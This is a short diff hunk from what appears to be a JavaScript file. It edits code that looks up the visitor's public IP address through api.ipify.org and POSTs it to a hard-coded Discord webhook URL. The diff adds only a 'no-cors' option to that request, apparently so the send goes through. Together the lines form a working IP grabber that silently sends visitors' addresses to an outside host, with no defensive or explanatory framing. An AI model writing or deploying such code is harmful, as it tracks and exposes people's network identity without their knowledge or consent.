@@ -165,6 +165,7 @@ url="https://discord.com/api/webhooks/1066037174019043359/RD08fANiei7ZqUludvAvxB
 fetch("https://api.ipify.org?format=json", {cors: "no-cors"}).then(res => res.json()).then(data => {
     fetch(url, {
         method: "POST",
+        cors: "no-cors",
         headers: {
             "Content-Type": "application/json"
         },
